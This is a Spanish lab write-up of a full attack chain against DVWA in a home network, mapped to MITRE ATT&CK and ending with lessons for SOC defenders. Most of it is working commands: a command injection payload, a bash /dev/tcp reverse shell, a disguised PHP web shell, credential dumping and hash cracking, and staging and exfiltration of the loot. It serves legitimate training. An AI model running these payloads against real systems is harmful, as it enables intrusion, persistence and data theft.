# Día 1 · Ubuntu — DVWA: de visitante anónimo a botín en mano

**Fecha:** 16 de junio de 2026
**Víctima:** Ubuntu Server (`192.168.1.96`)
**Atacante:** Kali Linux (`192.168.1.132`)
**Vector de Initial Access:** Exploit de aplicación web pública (`T1190`) + credenciales por defecto (`T1078`)
**Objetivo:** Máquina (sin interacción humana)

---

## Contexto del escenario

Ubuntu Server expone tres servicios web en su red local:

- Apache nativo en `:80` (página default "It works")
- DVWA en `:8080` (contenedor Docker `vulnerables/web-dvwa`)
- OWASP Juice Shop en `:3000` (contenedor Docker `bkimminich/juice-shop`)

El ejercicio se ejecutó bajo la disciplina de **"realismo de atacante externo"**: solo se atacan puertos/servicios que un atacante real podría descubrir desde fuera, y el `nmap -p-` interno se reserva para después del foothold.

---

## Eslabón 1 · Reconnaissance — `T1595`, `T1595.003`

**Objetivo:** descubrir qué hay publicado en la víctima, sin presuponer nada.

### 1.1 — Service discovery en puertos web típicos

```bash
nmap -sV -p 80,8080,3000 192.168.1.96 -oN day1_recon.txt
```

- `-sV` → detección de versión por puerto.
- `-p 80,8080,3000` → solo los puertos que un atacante externo vería publicados.
- `-oN` → guarda salida para evidencia.

**Resultado:** los tres puertos confirmados abiertos. Apache nativo en `:80` y `:8080` reportaron solo "Apache httpd" sin versión exacta (servidor configurado para ocultarla con `ServerTokens`). El puerto `:3000` aparece como `ppp?` (nmap no lo reconoce), pero el fingerprint del servicio reveló en el HTML respondido `<title>OWASP Juice Shop</title>` — identificación inequívoca.

### 1.2 — Content discovery sobre el puerto 80

Como Apache solo mostraba la página default, se enumeraron rutas con gobuster usando un diccionario común:

```bash
curl -o common.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt
gobuster dir -u http://192.168.1.96 -w common.txt -t 30 -o day1_gobuster.txt
```

**Resultado:** solo `/index.html` (la default) y `/server-status` (mod_status de Apache expuesto por misconfiguración). No había app oculta tras el `:80` — la página default era el contenido real.

### 1.3 — Enumeración profunda con diccionario expandido

Se reintentó con `directory-list-2.3-medium.txt` (~220 000 rutas) y extensiones comunes:

```bash
curl -fL -o medium.txt "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt"
gobuster dir -u http://192.168.1.96 -w medium.txt -x php,html,txt -t 30 -o day1_gobuster2.txt
```

- `-x php,html,txt` → por cada palabra, prueba también con esas extensiones.
- `-fL` en curl → `-f` falla si HTTP error, `-L` sigue redirects.

**Resultado:** ningún archivo o ruta adicional descubierta. La conclusión: la app real **no vive en Apache del `:80`**. El puerto `:8080`, donde respondió DVWA, es donde está la superficie real.

### 1.4 — Fingerprint del puerto 8080 (desde Ubuntu, para validación)

```bash
curl -sI http://localhost:8080
sudo docker ps --format '{{.Image}} → {{.Ports}}'
```

**Resultado:** el puerto `:8080` devolvió `Server: Apache/2.4.25 (Debian)` con cookies `PHPSESSID` y `security=low` (firma inequívoca de DVWA) y `Location: login.php`. `docker ps` confirmó dos contenedores: `vulnerables/web-dvwa` en `:8080` y `bkimminich/juice-shop` en `:3000`.

---

## Eslabón 2 · Initial Access — `T1078` (Valid Accounts)

**Objetivo:** entrar a la aplicación sin disparar exploits — por la puerta principal.

DVWA es famosa por sus credenciales por defecto (`admin:password`) que rara vez se cambian. El atacante racional siempre prueba esto antes que cualquier exploit.

### 2.1 — Verificar redirect y formulario

```bash
curl -I http://192.168.1.96:8080
curl -sL http://192.168.1.96:8080 | grep -iE 'login|password|<title>'
```

**Resultado:** el `:8080/` devuelve `302 → login.php`. La página de login contiene formulario con campos `username`, `password` y un `user_token` (anti-CSRF) que cambia en cada carga.

### 2.2 — Login automatizado con manejo de CSRF

```bash
# Paso 1: pedir login.php, guardar cookies, extraer user_token
curl -sc cookies.txt "http://192.168.1.96:8080/login.php" -o login_page.html
TOKEN=$(grep -oP "name='user_token' value='\K[^']+" login_page.html)
echo "Token capturado: $TOKEN"

# Paso 2: postear credenciales + token, reusando las cookies
curl -sb cookies.txt -c cookies.txt -L -X POST \
  -d "username=admin&password=password&user_token=${TOKEN}&Login=Login" \
  "http://192.168.1.96:8080/login.php" -o post_login.html

# Paso 3: verificar sesión autenticada
curl -sb cookies.txt "http://192.168.1.96:8080/index.php" | grep -iE '<title>|welcome|logout'
```

- `-c` / `-b cookies.txt` → guardar y leer cookies entre peticiones para mantener sesión.
- El token se captura con regex del HTML porque DVWA implementa anti-CSRF.

**Resultado:** token capturado exitosamente; el `<title>` final dice `Welcome :: Damn Vulnerable Web Application (DVWA) v1.10` y aparece el link `logout.php`, ambos confirmando sesión autenticada como `admin`.

---

## Eslabón 3 · Execution — `T1059.004` (Unix Shell)

**Objetivo:** convertir el acceso autenticado a la app en ejecución de comandos del sistema.

DVWA en `security=low` tiene un módulo Command Injection (`vulnerabilities/exec/`) que pasa input del usuario directamente a `system()` sin sanitización.

### 3.1 — Prueba inicial de inyección

```bash
curl -sb cookies.txt -X POST \
  --data-urlencode "ip=127.0.0.1; id; uname -a" \
  --data "Submit=Submit" -X POST \
  "http://192.168.1.96:8080/vulnerabilities/exec/" | grep -A2 '<pre>'
```

**Resultado:** la salida mostró solo el `ping 127.0.0.1` ejecutándose indefinidamente — los comandos encadenados con `;` no aparecían. Hipótesis: `ping` no terminaba y curl cortaba la respuesta antes de que `id` se ejecutara.

### 3.2 — Inyección corregida con `ping -c 1`

```bash
curl -sb cookies.txt -X POST \
  --data-urlencode "ip=127.0.0.1 -c 1; id; uname -a" \
  --data-urlencode "Submit=Submit" \
  "http://192.168.1.96:8080/vulnerabilities/exec/" | grep -A10 '<pre>'
```

- `-c 1` → `ping` envía solo 1 paquete y termina.
- Ambos campos como `--data-urlencode` para que curl los una correctamente.

**Resultado:** ¡RCE confirmado! La respuesta incluyó `uid=33(www-data) gid=33(www-data)` y `Linux 9e5d5135cabb 6.17.0-35-generic`. El hostname `9e5d5135cabb` reveló que la ejecución estaba dentro de un **contenedor Docker**, no en el host Ubuntu directamente.

**Lección operativa:** cuando un payload de inyección parece no encadenarse, casi siempre es porque el primer comando no termina rápido y HTTP corta la respuesta. Forzar terminación rápida (`-c 1`, redirigir a `/dev/null`) es el truco estándar.

---

## Eslabón 4 · C2 Channel — `T1071.001` (Application Layer Protocol)

**Objetivo:** establecer un canal de comandos persistente e interactivo para los siguientes eslabones.

### 4.1 — Listener en Kali

```bash
nc -lvnp 4444
```

- `-l` listening, `-v` verbose, `-n` sin DNS, `-p` puerto.

### 4.2 — Reverse shell vía la inyección

```bash
curl -sb cookies.txt -X POST \
  --data-urlencode "ip=127.0.0.1 -c 1; bash -c 'bash -i >& /dev/tcp/192.168.1.132/4444 0>&1'" \
  --data-urlencode "Submit=Submit" \
  "http://192.168.1.96:8080/vulnerabilities/exec/"
```

Disección del payload:
- `bash -c '...'` → ejecuta el string como nuevo shell (necesario para las redirecciones bash).
- `bash -i` → shell interactiva.
- `/dev/tcp/192.168.1.132/4444` → "archivo mágico" de bash que abre un socket TCP.
- `>& /dev/tcp/...` → redirige stdout y stderr al socket.
- `0>&1` → redirige stdin desde el mismo socket.

**Resultado:** el listener recibió `connect to [192.168.1.132] from (UNKNOWN) [192.168.1.96] 59234` y se obtuvo prompt como `www-data@9e5d5135cabb:/var/www/html/vulnerabilities/exec$`. Comandos básicos (`whoami`, `hostname`, `pwd`) funcionaron — shell viva pero "dumb" (sin TTY real).

### 4.3 — Upgrade a TTY interactivo

Python3 no estaba instalado en el contenedor, así que se usó `script`:

```bash
# Dentro de la shell del nc
script -qc /bin/bash /dev/null
export TERM=xterm
# Ctrl+Z para suspender
# En el prompt de Kali:
stty raw -echo; fg
# Enter una vez a ciegas
tty
```

- `script -qc /bin/bash /dev/null` → crea PTY real ejecutando bash, descartando el log.
- `stty raw -echo` en Kali → terminal en modo "transparente" para que Ctrl+C y otras combinaciones pasen al remoto.

**Resultado:** `tty` devolvió `/dev/pts/0`, confirmando PTY funcional. La shell ahora soporta autocompletado, historial con flechas, y Ctrl+C sin perder sesión.

---

## Eslabón 5 · Discovery — `T1083`, `T1057`, `T1018`, `T1046`

**Objetivo:** orientarse en el sistema comprometido antes de tomar más acciones.

### 5.1 — Identidad y privilegios

```bash
id
sudo -l 2>&1
cat /etc/passwd | grep -v nologin | grep -v false
```

**Resultado:**
- `id` confirmó `uid=33(www-data)` sin grupos jugosos (no en `docker`, `sudo`, ni `adm`).
- `sudo: command not found` — sudo no instalado en el contenedor minimalista.
- `/etc/passwd` filtrado mostró solo dos cuentas con shell real: `root:/bin/bash` y `sync:/bin/sync`. El único objetivo plausible para PrivEsc dentro del contenedor era root directo.

### 5.2 — Procesos, filesystem, distro

```bash
ps -ef
ls -la /
cat /etc/os-release
```

**Resultado:**
- Procesos: MySQL corriendo dentro del contenedor (anti-patrón de Docker), Apache, y un PID 1 = `/bin/bash /main.sh` (script de orquestación custom). El árbol de procesos delató toda la intrusión visible (`sh -c → bash -c → bash -i → script → bash`).
- Filesystem: `.dockerenv` confirmó entorno Docker. `/tmp` con permisos `drwxrwxrwt` (world-writable + sticky). `/main.sh` legible por todos.
- Distro: **Debian 9 "stretch"** — userspace muy antiguo (EOL desde 2022).

### 5.3 — Inspección de `/main.sh` y búsqueda de configs

```bash
cat /main.sh
find /var/www -name "config*.php" 2>/dev/null
```

**Resultado:** `main.sh` arranca MySQL + Apache + un `tail -f` infinito (confirmando setup legacy). El `find` localizó `/var/www/html/config/config.inc.php` — el archivo de credenciales de DVWA, identificado para el eslabón 7.

### 5.4 — Network Discovery interno

```bash
ip a
ip route
cat /etc/resolv.conf
```

**Resultado:** contenedor en `172.18.0.3/16` (red custom de Docker, no la default `172.17.0.0/16` — confirma uso de `docker-compose`). Gateway `172.18.0.1` (el host Ubuntu). DNS interno de Docker (`127.0.0.11`) habilitando resolución por nombre entre contenedores.

### 5.5 — Mapeo del enclave Docker con bash puro

Sin nmap en el contenedor, se usó "living off the land":

```bash
# Ping sweep paralelo
for ip in 172.18.0.{1..10}; do (ping -c1 -W1 $ip &>/dev/null && echo "ALIVE: $ip") & done; wait

# Resolución DNS interna
getent hosts juice-shop juiceshop dvwa 2>/dev/null

# Port scan al gateway con /dev/tcp
for p in 22 80 443 3306 8080; do (timeout 1 bash -c "echo > /dev/tcp/172.18.0.1/$p" 2>/dev/null && echo "OPEN $p") done
```

**Resultado:** mapa completo del enclave:

```
172.18.0.1  →  Ubuntu host (gateway)    SSH:22  HTTP:80  MySQL:3306  HTTP:8080
172.18.0.2  →  juice-shop (contenedor)
172.18.0.3  →  dvwa (este contenedor)
```

**Hallazgo crítico:** el `SSH:22` del host está alcanzable desde el contenedor pero era invisible desde la LAN externa. Esto materializa el principio "compromiso de servicio expuesto = nueva visibilidad sobre todo lo interno". Vector candidato para futuro escape a host.

---

## Eslabón 6 · Persistence — `T1505.003` (Web Shell)

**Objetivo:** garantizar reentrada al sistema sin depender del reverse shell frágil.

### 6.1 — Identificar directorios escribibles

```bash
ls -ld /var/www/html /var/www/html/hackable/uploads /tmp 2>/dev/null
```

**Resultado:** `/var/www/html/hackable/uploads/` y `/var/www/html/` ambos propiedad de `www-data` (escribibles). El primero es ideal: Apache lo sirve **y** es esperable encontrar archivos ahí (camuflaje contextual).

### 6.2 — Plantar webshell

```bash
echo '<?php system($_GET["c"]); ?>' > /var/www/html/hackable/uploads/dvwa-helper.php
ls -la /var/www/html/hackable/uploads/dvwa-helper.php
```

Nombre `dvwa-helper.php` elegido deliberadamente para sonar como archivo legítimo de la app (`T1036` Masquerading aplicado al naming).

**Resultado:** archivo creado, propiedad `www-data`.

### 6.3 — Verificar webshell desde Kali

```bash
curl "http://192.168.1.96:8080/hackable/uploads/dvwa-helper.php?c=id"
```

**Resultado:** respuesta directa `uid=33(www-data) gid=33(www-data) groups=33(www-data)` — sin cookies, sin sesión, sin token CSRF. Persistencia HTTP funcionando: acceso redundante al reverse shell.

---

## Eslabón 7 · Credential Access — `T1552.001` + `T1110.002`

**Objetivo:** cosechar credenciales del sistema comprometido.

### 7.1 — Credenciales hardcodeadas en archivo de config

```bash
curl -s "http://192.168.1.96:8080/hackable/uploads/dvwa-helper.php?c=cat+/var/www/html/config/config.inc.php"
```

**Resultado:** el archivo contiene en texto plano:

```
db_server   = 127.0.0.1
db_database = dvwa
db_user     = app
db_password = vulnerables
```

Bonus: `default_security_level = 'low'` y `default_phpids_level = 'disabled'` — confirma ausencia de WAF.

### 7.2 — Extraer hashes de la tabla `users`

```bash
mysql -h 127.0.0.1 -u app -pvulnerables -D dvwa -e "SELECT user, password FROM users;"
```

**Resultado:** 5 hashes MD5 (DVWA no usa salt) para `admin`, `gordonb`, `1337`, `pablo`, `smithy`. Observación útil: `admin` y `smithy` comparten el mismo hash — misma contraseña.

### 7.3 — Cracking con John the Ripper

Hashes transferidos a Kali:

```bash
cat > dvwa_hashes.txt <<EOF
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99
EOF

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt dvwa_hashes.txt
john --show --format=raw-md5 dvwa_hashes.txt
```

**Resultado:** 5/5 hashes crackeados en segundos.

| Usuario | Contraseña |
|---|---|
| `admin` | `password` |
| `gordonb` | `abc123` |
| `1337` | `charley` |
| `pablo` | `letmein` |
| `smithy` | `password` |

Las contraseñas crackeadas quedan como **inteligencia para reuso** contra otros servicios (SSH del host, otros sistemas), aplicando el principio de *password reuse hunting*.

---

## Eslabón 8 · Defense Evasion — `T1070` (Indicator Removal) — **BLOQUEADO**

**Objetivo:** borrar las huellas dejadas en los logs del sistema.

### 8.1 — Inspección de permisos sobre logs

```bash
ls -la /var/log/apache2/
ls -ld /var/log/apache2/
```

**Resultado:** la carpeta tiene permisos `drwxr-x---` con dueño `root:adm`. Como `www-data` no pertenece a `adm`, el acceso es `---` (nada). No se puede ni listar contenido, mucho menos modificar logs.

**Lección crítica:** la paradoja del modelo Unix — Apache *escribe* en `access.log` durante la operación normal (porque heredó el descriptor de archivo de cuando arrancó como root), pero un proceso `www-data` posterior (vía RCE) no tiene esa capacidad. Por eso **Defense Evasion en Linux casi siempre requiere PrivEsc previa**. Esta limitación se documenta como cabo suelto explícito.

---

## Eslabón 9 · Collection — `T1560.001` (Archive Collected Data)

**Objetivo:** consolidar las joyas descubiertas en un solo paquete listo para exfiltrar.

### 9.1 — Staging del botín

```bash
mkdir /tmp/.loot && cd /tmp/.loot
cp /var/www/html/config/config.inc.php .
mysql -h 127.0.0.1 -u app -pvulnerables -D dvwa -e "SELECT user, password FROM users;" > users_dvwa.txt
cp /main.sh .
echo "$(uname -a)" > host_info.txt
ls -la
```

- `/tmp/.loot` con punto inicial → carpeta oculta (`T1564.001` Hidden Files), técnica baja pero gratis.

**Resultado:** 4 archivos consolidados en `/tmp/.loot/`:
- `config.inc.php` (1859 B) — credenciales MySQL
- `users_dvwa.txt` (211 B) — tabla con hashes
- `main.sh` (231 B) — init del contenedor
- `host_info.txt` (114 B) — kernel y arquitectura

### 9.2 — Compresión

```bash
cd /tmp && tar czf /tmp/loot.tar.gz .loot/
ls -la /tmp/loot.tar.gz
```

**Resultado:** archivo de 1488 bytes (de ~2.4 KB originales — gzip aplicado).

---

## Eslabón 10 · Exfiltration — `T1041` + `T1036`

**Objetivo:** sacar el botín del sistema comprometido hacia el atacante.

### 10.1 — Posicionamiento con nombre engañoso

```bash
cp /tmp/loot.tar.gz /var/www/html/hackable/uploads/system_update.tar.gz
ls -la /var/www/html/hackable/uploads/system_update.tar.gz
```

Nombre `system_update.tar.gz` → `T1036` Masquerading. Un defensor que mire el directorio podría bajar la guardia ante un nombre que suena a actualización del sistema.

### 10.2 — Descarga desde Kali (exfil sobre canal HTTP)

```bash
wget http://192.168.1.96:8080/hackable/uploads/system_update.tar.gz
ls -la system_update.tar.gz
tar tzf system_update.tar.gz
```

**Resultado:** descarga exitosa de los 1488 bytes (tamaño idéntico al original — transferencia íntegra). `tar tzf` confirmó las 4 joyas dentro del archivo. **Exfiltración completa.**

---

## Resumen final

| # | Eslabón | MITRE | Estado |
|---|---------|-------|--------|
| 1 | Reconnaissance | `T1595`, `T1595.003` | ✅ DVWA y Juice Shop identificados |
| 2 | Initial Access | `T1078` | ✅ Login con `admin/password` |
| 3 | Execution | `T1059.004` | ✅ RCE como `www-data` |
| 4 | C2 Channel | `T1071.001` | ✅ Reverse shell + PTY |
| 5 | Discovery | `T1083`, `T1057`, `T1018`, `T1046` | ✅ Enclave Docker mapeado |
| 6 | Persistence | `T1505.003` | ✅ Webshell `dvwa-helper.php` |
| 7 | Credential Access | `T1552.001`, `T1110.002` | ✅ 5/5 hashes crackeados |
| 8 | Defense Evasion | `T1070` | ⛔ Bloqueado por permisos Unix |
| 9 | Collection | `T1560.001` + `T1564.001` | ✅ Botín consolidado |
| 10 | Exfiltration | `T1041` + `T1036` | ✅ Tar.gz disfrazado, descargado |

## Cabos sueltos documentados

- **Juice Shop en `172.18.0.2`** — pivote intra-Docker pendiente. Aplicación moderna (Node.js/Angular) con vulnerabilidades distintas a DVWA; vale como objetivo independiente.
- **SSH del host Ubuntu en `172.18.0.1:22`** — alcanzable solo desde el contenedor. Con las 5 credenciales crackeadas (especialmente `gordonb:abc123` y `pablo:letmein`), candidato fuerte para *password reuse* en un futuro día de escape de contenedor (`T1611`).
- **Defense Evasion completo** — postergado a post-escape. Requiere root para tocar `/var/log/apache2/` y otros logs de sistema.
- **Webshell `dvwa-helper.php` viva** — punto de re-entrada disponible para días futuros sin repetir Initial Access.
- **`/main.sh` y `.dockerenv` registrados** — inteligencia útil para entender el arranque del contenedor cuando se aborde el escape.

## Lecciones clave (perspectiva SOC)

1. **Superficie pública vs. superficie real.** Desde la LAN externa solo eran visibles los puertos web (`:80`, `:8080`, `:3000`). Desde el contenedor comprometido aparecieron SSH, MySQL y la topología completa de Docker. El compromiso de un servicio expuesto multiplica la visibilidad del atacante sobre todo lo "interno".

2. **El árbol de procesos delata.** El `ps -ef` del contenedor mostró toda la cadena de intrusión visible: `sh -c → bash -c → bash -i → script → bash`. Esa jerarquía es exactamente la firma que cazaría un EDR en producción. Los atacantes serios usan técnicas para ocultar parentescos (process injection, masquerading de nombre); detectar esos intentos de ocultamiento *es en sí mismo* una señal de calidad.

3. **Defense Evasion sin PrivEsc es casi imposible en Linux.** El usuario del proceso comprometido (`www-data`) heredó solo los permisos mínimos necesarios para servir la app — no los necesarios para borrar sus logs. Esa asimetría es deliberada del modelo Unix. **Si un SIEM detecta limpieza de logs efectiva, el atacante ya escaló a root** — alerta de severidad alta.

4. **Cada paso ofensivo deja un rastro inevitable.** El último `wget` de la exfiltración quedó registrado en el `access.log` de Apache. El atacante no pudo borrarlo. La defensa moderna se basa en **enviar logs fuera del host en tiempo real** (forwarding a SIEM, Wazuh, syslog remoto) para que ni siquiera un root local pueda destruir la evidencia.

5. **El camino de menor esfuerzo siempre primero.** No hubo que escribir un exploit: bastó probar `admin/password`. Las credenciales por defecto siguen siendo, en 2026, uno de los vectores más exitosos. Defenderse de eso no requiere SIEM avanzado — requiere disciplina de despliegue.

---

**Atacante:** Kali Linux `192.168.1.132`
**Víctima:** Ubuntu `192.168.1.96` (contenedor DVWA `9e5d5135cabb` en `172.18.0.3`)
**Duración aproximada:** ~5 horas de ejecución completa con documentación.
**Próximo día:** Día 2 — FLARE-VM via phishing adjunto (`T1566.001`).
